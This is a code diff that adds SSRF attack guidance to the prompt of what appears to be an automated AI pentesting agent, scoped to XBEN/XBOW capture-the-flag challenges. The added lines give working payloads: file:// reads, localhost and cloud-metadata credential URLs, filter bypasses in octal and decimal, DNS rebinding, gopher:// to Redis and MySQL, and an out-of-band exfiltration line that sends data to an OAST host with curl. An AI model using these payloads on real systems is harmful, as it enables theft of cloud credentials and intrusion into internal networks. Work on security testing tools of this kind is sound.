@@ -145,7 +145,22 @@ Response: 200 OK — webhook saved
 Result: Received DNS + HTTP interaction from [redacted].com's server IP — blind SSRF confirmed
 
 **Step 4 — Report:**
-Tool call: report_finding { title: "Blind SSRF via webhook callback URL — server makes requests to arbitrary URLs", severity: "high", vulnerability_type: "ssrf_blind", confidence: 90 }`;
+Tool call: report_finding { title: "Blind SSRF via webhook callback URL — server makes requests to arbitrary URLs", severity: "high", vulnerability_type: "ssrf_blind", confidence: 90 }
+
+## CTF FLAG EXTRACTION (when target is an XBEN-* CTF challenge)
+
+Once SSRF is confirmed, exfil the flag via internal services:
+
+1. **file://** protocol if supported: ?url=file:///flag.txt
+2. **Internal endpoints**: many XBOW challenges expose a metadata-style /admin or /internal endpoint that returns the flag when accessed from localhost. Probe ?url=http://localhost/admin, http://127.0.0.1/flag, http://0.0.0.0/internal.
+3. **Cloud metadata** (less common in XBOW but standard SSRF): ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+4. **Bypass localhost filters**:
+   - 127.1, 127.0.0.0, 0.0.0.0, [::1], 0177.0.0.1 (octal), 2130706433 (decimal)
+   - DNS rebinding via attacker-controlled domain that resolves to 127.0.0.1
+5. **gopher://** for sending arbitrary TCP payloads (Redis, MySQL, SMTP) to the internal network if the SSRF accepts it.
+6. **Read the response** — the flag is in the body of the SSRF'd request. If only the response code is visible (blind SSRF), use OOB exfil: ?url=https://OAST/?leak=$(curl http://localhost/flag).
+
+Once FLAG{...} is captured in the response body, include it verbatim in the finding's evidence array.`;
 
 /**
  * SSRFHunterAgent discovers SSRF vulnerabilities by running a ReAct loop
